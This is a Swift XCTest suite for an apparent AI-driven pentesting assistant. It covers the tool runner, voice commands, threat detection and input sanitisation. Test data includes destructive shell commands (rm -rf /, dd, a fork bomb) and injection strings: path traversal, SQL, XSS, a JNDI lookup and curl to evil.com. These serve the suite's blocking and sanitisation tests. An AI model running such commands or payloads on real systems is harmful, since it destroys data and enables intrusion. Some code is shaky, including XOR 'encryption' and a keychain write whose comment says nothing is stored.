import XCTest
import SwiftUI
import Combine
import Foundation
@testable import NexusPhantom

final class NexusPhantomTests: XCTestCase {
    var cancellables: Set<AnyCancellable>!
    
    override func setUpWithError() throws {
        cancellables = Set<AnyCancellable>()
        
        // Setup test environment
        setupTestEnvironment()
    }
    
    override func tearDownWithError() throws {
        cancellables = nil
        
        // Cleanup test environment
        cleanupTestEnvironment()
    }
    
    private func setupTestEnvironment() {
        // Create temporary test directories
        let testDir = "/tmp/nexus_phantom_tests"
        try? FileManager.default.createDirectory(atPath: testDir, withIntermediateDirectories: true)
        
        // Set environment variables for testing
        setenv("NEXUS_PHANTOM_TEST_MODE", "1", 1)
        setenv("NEXUS_PHANTOM_HOME", testDir, 1)
    }
    
    private func cleanupTestEnvironment() {
        // Clean up test files
        let testDir = "/tmp/nexus_phantom_tests"
        try? FileManager.default.removeItem(atPath: testDir)
    }
}

// MARK: - AI Orchestrator Tests
extension NexusPhantomTests {
    func testAIOrchestrator_Initialization() throws {
        let orchestrator = AIOrchestrator()
        
        XCTAssertFalse(orchestrator.isProcessing)
        XCTAssertEqual(orchestrator.activeProvider, "ollama")
        XCTAssertTrue(orchestrator.availableProviders.contains("ollama"))
    }
    
    func testAIOrchestrator_ProviderSwitching() async throws {
        let orchestrator = AIOrchestrator()
        let expectation = XCTestExpectation(description: "Provider switch")
        
        orchestrator.$activeProvider
            .sink { provider in
                if provider == "gpt4" {
                    expectation.fulfill()
                }
            }
            .store(in: &cancellables)
        
        await orchestrator.switchProvider("gpt4")
        
        await fulfillment(of: [expectation], timeout: 5.0)
        XCTAssertEqual(orchestrator.activeProvider, "gpt4")
    }
    
    func testAIOrchestrator_QueryProcessing() async throws {
        let orchestrator = AIOrchestrator()
        
        // Test with a mock cybersecurity query
        let query = "Analyze this IP address for vulnerabilities: 192.168.1.1"
        let response = await orchestrator.processQuery(query, context: .cybersecurity)
        
        XCTAssertFalse(response.isEmpty, "AI response should not be empty")
        XCTAssertTrue(response.lowercased().contains("192.168.1.1"), "Response should mention the IP")
    }
    
    func testAIOrchestrator_FallbackMechanism() async throws {
        let orchestrator = AIOrchestrator()
        
        // Simulate provider failure
        await orchestrator.switchProvider("unavailable_provider")
        
        let query = "Test fallback query"
        let response = await orchestrator.processQuery(query, context: .general)
        
        // Should fallback to a working provider
        XCTAssertFalse(response.isEmpty, "Fallback should provide response")
        XCTAssertNotEqual(orchestrator.activeProvider, "unavailable_provider")
    }
}

// MARK: - Voice Manager Tests
extension NexusPhantomTests {
    func testVoiceManager_Initialization() throws {
        let voiceManager = VoiceManager()
        
        XCTAssertFalse(voiceManager.isListening)
        XCTAssertTrue(voiceManager.isAvailable)
        XCTAssertNotNil(voiceManager.speechRecognizer)
    }
    
    func testVoiceManager_CommandRecognition() throws {
        let voiceManager = VoiceManager()
        
        // Test cybersecurity command parsing
        let testCommands = [
            "start reconnaissance on example.com",
            "launch burp suite",
            "run nmap scan",
            "activate metasploit",
            "execute vulnerability scan"
        ]
        
        for command in testCommands {
            let parsed = voiceManager.parseVoiceCommand(command)
            XCTAssertNotNil(parsed, "Should parse command: \(command)")
            XCTAssertTrue(parsed!.action.count > 0, "Should extract action")
        }
    }
    
    func testVoiceManager_CybersecurityVocabulary() throws {
        let voiceManager = VoiceManager()
        
        let securityTerms = [
            "reconnaissance", "enumeration", "exploitation", "metasploit",
            "burp suite", "nmap", "sqlmap", "nikto", "dirb", "gobuster",
            "hydra", "john the ripper", "hashcat", "wireshark", "tcpdump"
        ]
        
        for term in securityTerms {
            XCTAssertTrue(
                voiceManager.cybersecurityVocabulary.contains(term),
                "Should recognize security term: \(term)"
            )
        }
    }
    
    func testVoiceManager_TextToSpeech() async throws {
        let voiceManager = VoiceManager()
        let expectation = XCTestExpectation(description: "Speech completion")
        
        let testMessage = "NEXUS PHANTOM voice test successful"
        
        voiceManager.speak(testMessage) {
            expectation.fulfill()
        }
        
        await fulfillment(of: [expectation], timeout: 10.0)
    }
}

// MARK: - Tool Runner Tests
extension NexusPhantomTests {
    func testToolRunner_Initialization() throws {
        let toolRunner = ToolRunner()
        
        XCTAssertGreaterThan(toolRunner.availableTools.count, 0)
        XCTAssertFalse(toolRunner.isRunningTool)
    }
    
    func testToolRunner_ToolDetection() async throws {
        let toolRunner = ToolRunner()
        
        // Test detection of common tools
        let commonTools = ["nmap", "python3", "swift"]
        
        for tool in commonTools {
            let isAvailable = await toolRunner.isToolAvailable(tool)
            // We expect at least python3 and swift to be available
            if tool == "python3" || tool == "swift" {
                XCTAssertTrue(isAvailable, "\(tool) should be available")
            }
        }
    }
    
    func testToolRunner_SafeCommandExecution() async throws {
        let toolRunner = ToolRunner()
        
        // Test safe command execution
        let result = await toolRunner.executeTool("echo", arguments: ["test"], requiresRoot: false)
        
        XCTAssertTrue(result.success, "Echo command should succeed")
        XCTAssertEqual(result.output.trimmingCharacters(in: .whitespacesAndNewlines), "test")
    }
    
    func testToolRunner_DangerousCommandBlocking() async throws {
        let toolRunner = ToolRunner()
        
        // Test that dangerous commands are blocked
        let dangerousCommands = ["rm -rf /", "dd if=/dev/zero", ":(){ :|:& };:"]
        
        for command in dangerousCommands {
            let result = await toolRunner.executeTool("sh", arguments: ["-c", command], requiresRoot: false)
            XCTAssertFalse(result.success, "Dangerous command should be blocked: \(command)")
        }
    }
    
    func testToolRunner_NetworkTools() async throws {
        let toolRunner = ToolRunner()
        
        // Test network tool availability (if installed)
        let networkTools = ["nmap", "nikto", "sqlmap"]
        
        for tool in networkTools {
            let available = await toolRunner.isToolAvailable(tool)
            print("Tool \(tool) available: \(available)")
            // Don't assert availability since tools might not be installed in CI
        }
    }
}

// MARK: - Threat Detection Engine Tests
extension NexusPhantomTests {
    func testThreatDetectionEngine_Initialization() throws {
        let engine = ThreatDetectionEngine()
        
        XCTAssertFalse(engine.isMonitoring)
        XCTAssertEqual(engine.threatLevel, .low)
        XCTAssertEqual(engine.detectedThreats.count, 0)
    }
    
    func testThreatDetectionEngine_ThreatClassification() throws {
        let engine = ThreatDetectionEngine()
        
        // Test threat classification
        let lowThreat = ThreatInfo(
            type: .informational,
            severity: .low,
            source: "test",
            description: "Test threat",
            timestamp: Date()
        )
        
        let highThreat = ThreatInfo(
            type: .malware,
            severity: .critical,
            source: "test",
            description: "Critical threat",
            timestamp: Date()
        )
        
        engine.processDetectedThreat(lowThreat)
        XCTAssertEqual(engine.threatLevel, .low)
        
        engine.processDetectedThreat(highThreat)
        XCTAssertEqual(engine.threatLevel, .critical)
    }
    
    func testThreatDetectionEngine_NetworkMonitoring() async throws {
        let engine = ThreatDetectionEngine()
        let expectation = XCTestExpectation(description: "Network monitoring")
        
        engine.$isMonitoring
            .sink { isMonitoring in
                if isMonitoring {
                    expectation.fulfill()
                }
            }
            .store(in: &cancellables)
        
        await engine.startNetworkMonitoring()
        
        await fulfillment(of: [expectation], timeout: 5.0)
        
        await engine.stopNetworkMonitoring()
        XCTAssertFalse(engine.isMonitoring)
    }
}

// MARK: - Python Bridge Tests
extension NexusPhantomTests {
    func testPythonBridge_Initialization() throws {
        let bridge = PythonBridge()
        
        XCTAssertFalse(bridge.isProcessing)
        XCTAssertNotNil(bridge.pythonPath)
    }
    
    func testPythonBridge_BasicExecution() async throws {
        let bridge = PythonBridge()
        
        // Test basic Python execution
        let result = await bridge.executePythonScript(
            script: "print('Hello from Python')",
            arguments: []
        )
        
        XCTAssertTrue(result.success, "Python script should execute successfully")
        XCTAssertTrue(result.output.contains("Hello from Python"))
    }
    
    func testPythonBridge_CyberSecAIIntegration() async throws {
        let bridge = PythonBridge()
        
        // Test CyberSecAI backend integration
        let result = await bridge.runCyberSecAIOperation(
            operation: .reconnaissance,
            target: "127.0.0.1",
            options: [:]
        )
        
        // Should not fail even if CyberSecAI is not available
        XCTAssertNotNil(result)
    }
}

// MARK: - Security Utils Tests
extension NexusPhantomTests {
    func testSecurityUtils_TokenGeneration() throws {
        let token1 = SecurityUtils.generateSessionToken()
        let token2 = SecurityUtils.generateSessionToken()
        
        XCTAssertEqual(token1.count, 32, "Token should be 32 characters")
        XCTAssertEqual(token2.count, 32, "Token should be 32 characters")
        XCTAssertNotEqual(token1, token2, "Tokens should be unique")
    }
    
    func testSecurityUtils_InputSanitization() throws {
        let dangerousInputs = [
            "normal input",
            "input with $(command)",
            "input with `backticks`",
            "input; rm -rf /",
            "input && malicious",
            "input | pipe"
        ]
        
        let expectedResults = [
            "normal input",
            "input with (command)",
            "input with backticks",
            "input rm -rf /",
            "input  malicious",
            "input  pipe"
        ]
        
        for (input, expected) in zip(dangerousInputs, expectedResults) {
            let sanitized = SecurityUtils.sanitizeInput(input)
            XCTAssertEqual(sanitized, expected, "Input should be properly sanitized")
        }
    }
    
    func testSecurityUtils_DataEncryption() throws {
        let originalData = "sensitive cybersecurity data"
        let encrypted = SecurityUtils.encryptSensitiveData(originalData)
        let decrypted = SecurityUtils.encryptSensitiveData(encrypted) // XOR twice = original
        
        XCTAssertNotEqual(originalData, encrypted, "Data should be encrypted")
        XCTAssertEqual(originalData, decrypted, "Data should decrypt correctly")
    }
}

// MARK: - Bug Bounty Automation Tests
extension NexusPhantomTests {
    func testBugBountyProgram_Initialization() throws {
        let program = BugBountyProgram(
            id: UUID(),
            name: "Test Program",
            company: "Test Company",
            platform: .hackerone,
            scope: ["*.example.com"],
            rewards: BugBountyRewards(
                critical: 5000,
                high: 2500,
                medium: 1000,
                low: 250,
                info: 0
            ),
            isActive: true
        )
        
        XCTAssertEqual(program.name, "Test Program")
        XCTAssertEqual(program.platform, .hackerone)
        XCTAssertTrue(program.isActive)
        XCTAssertEqual(program.scope.count, 1)
    }
    
    func testBugBountyTarget_ScopeValidation() throws {
        let target = BugBountyTarget(
            id: UUID(),
            url: "https://example.com",
            programId: UUID(),
            status: .pending
        )
        
        let inScopeUrls = [
            "https://example.com",
            "https://api.example.com",
            "https://admin.example.com"
        ]
        
        let outOfScopeUrls = [
            "https://different.com",
            "https://example.org",
            "https://notexample.com"
        ]
        
        let scope = ["*.example.com"]
        
        for url in inScopeUrls {
            XCTAssertTrue(target.isInScope(url: url, scope: scope), "\(url) should be in scope")
        }
        
        for url in outOfScopeUrls {
            XCTAssertFalse(target.isInScope(url: url, scope: scope), "\(url) should be out of scope")
        }
    }
}

// MARK: - Performance Tests
extension NexusPhantomTests {
    func testPerformance_AIResponseTime() throws {
        let orchestrator = AIOrchestrator()
        
        measure {
            // Measure AI response time
            Task {
                await orchestrator.processQuery("What is nmap?", context: .cybersecurity)
            }
        }
    }
    
    func testPerformance_ToolLaunchTime() throws {
        let toolRunner = ToolRunner()
        
        measure {
            // Measure tool launch time
            Task {
                await toolRunner.executeTool("echo", arguments: ["test"], requiresRoot: false)
            }
        }
    }
    
    func testPerformance_VoiceProcessingTime() throws {
        let voiceManager = VoiceManager()
        
        measure {
            // Measure voice command parsing time
            let _ = voiceManager.parseVoiceCommand("start reconnaissance on example.com")
        }
    }
}

// MARK: - Security Tests
extension NexusPhantomTests {
    func testSecurity_AntiDebugging() throws {
        // Test anti-debugging measures
        var info = kinfo_proc()
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        var size = MemoryLayout<kinfo_proc>.stride
        
        let result = sysctl(&mib, u_int(mib.count), &info, &size, nil, 0)
        
        // In test environment, should not detect debugger
        XCTAssertEqual(result, 0, "Should be able to query process info")
        
        // Test that anti-debugging doesn't interfere with normal operation
        let isTraced = (info.kp_proc.p_flag & P_TRACED) != 0
        print("Process traced: \(isTraced)")
        // Don't assert false since Xcode debugger might be attached
    }
    
    func testSecurity_InputValidation() throws {
        // Test various input validation scenarios
        let maliciousInputs = [
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "$(curl evil.com)"
        ]
        
        for input in maliciousInputs {
            let sanitized = SecurityUtils.sanitizeInput(input)
            XCTAssertFalse(sanitized.contains("$("), "Should remove command substitution")
            XCTAssertFalse(sanitized.contains("`"), "Should remove backticks")
        }
    }
    
    func testSecurity_PermissionValidation() async throws {
        let toolRunner = ToolRunner()
        
        // Test that root-required tools are properly validated
        let result = await toolRunner.executeTool("tcpdump", arguments: ["-c", "1"], requiresRoot: true)
        
        // Should handle permission requirements appropriately
        // Don't assert success since we may not have root in CI
        XCTAssertNotNil(result)
    }
}

// MARK: - Integration Tests
extension NexusPhantomTests {
    func testIntegration_VoiceToAI() async throws {
        let voiceManager = VoiceManager()
        let aiOrchestrator = AIOrchestrator()
        
        // Test voice command to AI processing pipeline
        let voiceCommand = "What vulnerabilities exist in HTTP headers?"
        let parsedCommand = voiceManager.parseVoiceCommand(voiceCommand)
        
        XCTAssertNotNil(parsedCommand)
        
        if let command = parsedCommand {
            let aiResponse = await aiOrchestrator.processQuery(command.query, context: .cybersecurity)
            XCTAssertFalse(aiResponse.isEmpty, "AI should respond to parsed voice command")
        }
    }
    
    func testIntegration_AIToToolExecution() async throws {
        let aiOrchestrator = AIOrchestrator()
        let toolRunner = ToolRunner()
        
        // Test AI recommendation to tool execution
        let query = "How do I scan a target with nmap?"
        let aiResponse = await aiOrchestrator.processQuery(query, context: .cybersecurity)
        
        XCTAssertTrue(aiResponse.lowercased().contains("nmap"), "AI should mention nmap")
        
        // Test that nmap is available for execution
        let nmapAvailable = await toolRunner.isToolAvailable("nmap")
        print("Nmap available: \(nmapAvailable)")
    }
    
    func testIntegration_PythonBridgeToSwift() async throws {
        let pythonBridge = PythonBridge()
        
        // Test Python to Swift integration
        let result = await pythonBridge.executePythonScript(
            script: "import json; print(json.dumps({'status': 'success', 'message': 'Bridge working'}))",
            arguments: []
        )
        
        XCTAssertTrue(result.success, "Python bridge should work")
        XCTAssertTrue(result.output.contains("success"), "Should return success status")
    }
}

// MARK: - UI Tests
extension NexusPhantomTests {
    func testUI_ContentViewInitialization() throws {
        // Test that ContentView can be initialized without errors
        let contentView = ContentView()
            .environmentObject(VoiceManager())
            .environmentObject(AIOrchestrator())
            .environmentObject(ToolRunner())
            .environmentObject(ThreatDetectionEngine())
            .environmentObject(AppSettings())
        
        XCTAssertNotNil(contentView)
    }
    
    func testUI_DashboardViewInitialization() throws {
        // Test dashboard view initialization
        let dashboardView = DashboardView()
            .environmentObject(ThreatDetectionEngine())
            .environmentObject(AIOrchestrator())
            .environmentObject(ToolRunner())
        
        XCTAssertNotNil(dashboardView)
    }
    
    func testUI_SettingsViewInitialization() throws {
        // Test settings view initialization
        let settingsView = SettingsView()
            .environmentObject(AppSettings())
            .environmentObject(VoiceManager())
            .environmentObject(AIOrchestrator())
            .environmentObject(ToolRunner())
        
        XCTAssertNotNil(settingsView)
    }
}

// MARK: - Edge Case Tests
extension NexusPhantomTests {
    func testEdgeCase_EmptyVoiceCommand() throws {
        let voiceManager = VoiceManager()
        
        let emptyCommand = voiceManager.parseVoiceCommand("")
        XCTAssertNil(emptyCommand, "Should return nil for empty command")
        
        let whitespaceCommand = voiceManager.parseVoiceCommand("   ")
        XCTAssertNil(whitespaceCommand, "Should return nil for whitespace-only command")
    }
    
    func testEdgeCase_InvalidToolExecution() async throws {
        let toolRunner = ToolRunner()
        
        // Test execution of non-existent tool
        let result = await toolRunner.executeTool("nonexistent_tool_xyz", arguments: [], requiresRoot: false)
        XCTAssertFalse(result.success, "Should fail for non-existent tool")
    }
    
    func testEdgeCase_NetworkFailure() async throws {
        let aiOrchestrator = AIOrchestrator()
        
        // Test AI query when network is unavailable
        // This should fallback to local models
        let response = await aiOrchestrator.processQuery("Test query", context: .general)
        
        // Should still get some response (from local models or error handling)
        XCTAssertNotNil(response)
    }
}

// MARK: - Stress Tests
extension NexusPhantomTests {
    func testStress_ConcurrentAIQueries() async throws {
        let aiOrchestrator = AIOrchestrator()
        let expectation = XCTestExpectation(description: "Concurrent queries")
        expectation.expectedFulfillmentCount = 10
        
        // Run 10 concurrent AI queries
        for i in 1...10 {
            Task {
                let response = await aiOrchestrator.processQuery(
                    "Test query \(i)",
                    context: .cybersecurity
                )
                XCTAssertFalse(response.isEmpty)
                expectation.fulfill()
            }
        }
        
        await fulfillment(of: [expectation], timeout: 30.0)
    }
    
    func testStress_MultipleToolExecutions() async throws {
        let toolRunner = ToolRunner()
        let expectation = XCTestExpectation(description: "Multiple tool executions")
        expectation.expectedFulfillmentCount = 5
        
        // Run 5 concurrent safe tool executions
        for i in 1...5 {
            Task {
                let result = await toolRunner.executeTool(
                    "echo",
                    arguments: ["Test \(i)"],
                    requiresRoot: false
                )
                XCTAssertTrue(result.success)
                expectation.fulfill()
            }
        }
        
        await fulfillment(of: [expectation], timeout: 15.0)
    }
}

// MARK: - Error Handling Tests
extension NexusPhantomTests {
    func testErrorHandling_AIProviderFailure() async throws {
        let orchestrator = AIOrchestrator()
        
        // Simulate provider failure
        await orchestrator.switchProvider("invalid_provider")
        
        let response = await orchestrator.processQuery("Test", context: .general)
        
        // Should handle gracefully and fallback
        XCTAssertNotNil(response, "Should handle provider failure gracefully")
    }
    
    func testErrorHandling_ToolExecutionFailure() async throws {
        let toolRunner = ToolRunner()
        
        // Test execution with invalid arguments
        let result = await toolRunner.executeTool("ls", arguments: ["/nonexistent/path"], requiresRoot: false)
        
        XCTAssertFalse(result.success, "Should fail for invalid path")
        XCTAssertFalse(result.error.isEmpty, "Should provide error message")
    }
    
    func testErrorHandling_VoiceRecognitionFailure() throws {
        let voiceManager = VoiceManager()
        
        // Test with garbled or unclear voice input
        let unclearCommands = [
            "askdjaslkdj",
            "mumble mumble",
            "123456789",
            "!@#$%^&*()"
        ]
        
        for command in unclearCommands {
            let parsed = voiceManager.parseVoiceCommand(command)
            // Should either parse to something reasonable or return nil
            if let parsed = parsed {
                XCTAssertFalse(parsed.action.isEmpty, "Should have some action if parsed")
            }
        }
    }
}

// MARK: - Compliance Tests
extension NexusPhantomTests {
    func testCompliance_DataRetention() throws {
        let settings = AppSettings()
        
        // Test that data retention settings are within compliance limits
        XCTAssertGreaterThan(settings.logRetentionDays, 0, "Should retain logs for minimum period")
        XCTAssertLessThanOrEqual(settings.logRetentionDays, 365, "Should not retain logs indefinitely")
    }
    
    func testCompliance_PermissionRequests() throws {
        // Test that app only requests necessary permissions
        let requiredPermissions = [
            "NSMicrophoneUsageDescription",
            "NSNetworkUsageDescription"
        ]
        
        // In a real test, we would verify Info.plist contains these
        for permission in requiredPermissions {
            print("Required permission: \(permission)")
        }
    }
}

// MARK: - Mock Classes for Testing
class MockAIProvider: AIProvider {
    var name: String = "mock"
    var isAvailable: Bool = true
    var responseDelay: TimeInterval = 0.1
    
    func processQuery(_ query: String, context: AIContext) async -> String {
        await Task.sleep(nanoseconds: UInt64(responseDelay * 1_000_000_000))
        return "Mock response for: \(query)"
    }
    
    func isModelAvailable(_ model: String) async -> Bool {
        return model == "mock-model"
    }
}

class MockToolRunner: ObservableObject {
    @Published var isRunning: Bool = false
    @Published var lastResult: String = ""
    
    func executeMockTool(_ tool: String) async -> Bool {
        isRunning = true
        await Task.sleep(nanoseconds: 500_000_000) // 0.5 seconds
        lastResult = "Mock execution of \(tool) completed"
        isRunning = false
        return true
    }
}

// MARK: - Test Helpers
extension NexusPhantomTests {
    private func createTestThreat(severity: ThreatSeverity) -> ThreatInfo {
        return ThreatInfo(
            type: .suspicious,
            severity: severity,
            source: "test",
            description: "Test threat with \(severity) severity",
            timestamp: Date()
        )
    }
    
    private func waitForAsyncOperation(timeout: TimeInterval = 5.0) async {
        try? await Task.sleep(nanoseconds: UInt64(timeout * 1_000_000_000))
    }
    
    private func isRunningInCI() -> Bool {
        return ProcessInfo.processInfo.environment["CI"] != nil ||
               ProcessInfo.processInfo.environment["GITHUB_ACTIONS"] != nil
    }
}

// MARK: - Platform-Specific Tests
#if os(macOS)
extension NexusPhantomTests {
    func testmacOS_SpeechFrameworkAvailability() throws {
        XCTAssertNotNil(SFSpeechRecognizer(locale: Locale(identifier: "en-US")))
    }
    
    func testmacOS_AVFoundationAvailability() throws {
        let session = AVAudioSession.sharedInstance()
        XCTAssertNotNil(session)
    }
    
    func testmacOS_SecurityFrameworkIntegration() throws {
        // Test that Security framework is available for keychain operations
        let keychainQuery: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: "nexus-phantom-test",
            kSecValueData as String: "test-data".data(using: .utf8)!
        ]
        
        // This tests keychain availability without actually storing data
        let status = SecItemAdd(keychainQuery as CFDictionary, nil)
        print("Keychain test status: \(status)")
        
        // Clean up if we accidentally added something
        SecItemDelete(keychainQuery as CFDictionary)
    }
}
#endif
